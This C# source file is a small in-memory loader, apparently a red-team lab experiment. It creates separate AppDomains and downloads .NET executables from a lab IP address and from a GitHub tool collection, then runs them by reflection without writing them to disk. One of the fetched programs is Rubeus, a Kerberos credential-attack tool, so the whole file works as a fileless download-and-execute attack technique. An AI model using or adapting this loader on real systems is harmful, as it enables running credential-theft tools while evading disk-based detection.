using System;
using System.Collections.Generic;
using System.Linq;
using System.Net;
using System.Reflection;
using System.Text;
using System.Threading;
using System.Threading.Tasks;

namespace Cell
{
    public class Worker : MarshalByRefObject
    {
        public void ReflectionFromWeb(string url, int retrycount=0, int timeoutTimer=0)
        {
            ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls12;
            WebClient client = new WebClient();
            byte[] programBytes = null;
            while (retrycount >= 0 && programBytes == null)
            {
                try
                {
                    programBytes = client.DownloadData(url);
                }
                catch (WebException ex)
                {
                    Console.WriteLine("Assembly not found yet. Sleeping for {0} sec ans retrying another {1} times(s)...", timeoutTimer, retrycount);
                    retrycount--;
                    Thread.Sleep(timeoutTimer * 1000);
                }
            }
            if (programBytes == null)
            {
                Console.WriteLine("Assembly not found, exiting now ...");
                Environment.Exit(-1);
            }
            Assembly dotnetProgram = Assembly.Load(programBytes);
            object[] parameters = new string[] { null };
            dotnetProgram.EntryPoint.Invoke(null, parameters);
        }
    }


    internal class Program
    {
        static void Main(string[] args)
        {

            AppDomain azeroth = AppDomain.CreateDomain("Azeroth");
            Console.WriteLine("AppDomain Azeroth created!");
            Console.ReadKey();
            Worker remoteWorker = (Worker)azeroth.CreateInstanceAndUnwrap(typeof(Worker).Assembly.FullName, new Worker().GetType().FullName);
            remoteWorker.ReflectionFromWeb("http://192.168.96.129/HelloReflectionWorld.exe");
            Console.ReadKey();
            Console.WriteLine("Unload Namek");
            AppDomain.Unload(azeroth);
            Console.ReadKey();
            AppDomain outlands = AppDomain.CreateDomain("Outlands");
            Console.WriteLine("Appdomain Outlands created!");
            remoteWorker = (Worker)outlands.CreateInstanceAndUnwrap(typeof(Worker).Assembly.FullName, new Worker().GetType().FullName);
            Console.ReadKey();
            remoteWorker.ReflectionFromWeb("http://192.168.96.129/mscorlib.exe");
            remoteWorker.ReflectionFromWeb("https://github.com/Flangvik/SharpCollection/raw/master/NetFramework_4.5_Any/Rubeus.exe");
            Console.WriteLine("Unload outlands");
            Console.ReadKey();
        }
    }
}
